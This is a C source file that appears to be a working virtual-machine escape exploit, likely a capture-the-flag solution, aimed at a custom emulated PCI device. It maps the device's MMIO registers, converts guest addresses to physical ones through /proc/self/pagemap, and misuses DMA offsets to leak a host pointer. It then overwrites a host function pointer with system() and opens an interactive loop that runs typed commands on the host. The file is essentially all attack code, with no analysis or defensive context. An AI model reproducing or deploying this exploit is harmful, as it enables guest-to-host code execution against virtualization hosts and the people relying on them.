#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define PAGE_SIZE 0x1000

uint64_t gva2gpa(void *addr)
{
    uint64_t page = 0;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
    {
        logErr("error in gva2gpa");
        exit(1);
    }
    lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
    read(fd, &page, 8);
    close(fd);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr & 0xfff);
}

char *mmio_mem;

void mmio_write(uint64_t hwaddr, uint64_t value)
{
    *(uint64_t *)(mmio_mem + hwaddr) = value;
}

void static inline setDMASRC(uint64_t src)
{
    mmio_write(0x4, src);
}

void static inline setDMAOFF(uint64_t off)
{
    mmio_write(0x8, off);
}

int main(int argc, char **argv, char **envp)
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
    {
        logErr("open(resource0)");
        return 1;
    }

    mmio_mem = mmap((void *)0x1337000ULL, 4 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
    {
        logErr("mmap");
        return 1;
    }

    char *buf = mmap(NULL, 4 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED)
    {
        logErr("mmap(buf)");
        return 1;
    }

    memset(buf, 0x41, 4 * PAGE_SIZE);
    mlock(buf, 4 * PAGE_SIZE);

    setDMASRC(gva2gpa(buf));
    setDMAOFF(0x1058);
    uint64_t dummy = *(uint64_t *)mmio_mem;

    uint64_t leak = *(uint64_t *)(buf);
    logInfo("leak = 0x%lx", leak);

    uint64_t system_plt = leak - 0x11388e0;
    setDMAOFF(0x1118);
    *(uint64_t *)buf = system_plt;

    *(uint64_t *)mmio_mem = dummy;

    char command[0x100] = {0};

    while (1)
    {
        fputs("$ ", stdout);
        read(0, command, sizeof command - 1);
        command[strlen(command) - 1] = 0;
        if (!strcmp(command, "exit"))
        {
            return 0;
        }

        setDMAOFF(0x1118 + 0x8);
        strcpy(buf, command);

        *(uint64_t *)mmio_mem = dummy;
        mmio_write(0x10, 0);
    }
    return 0;
}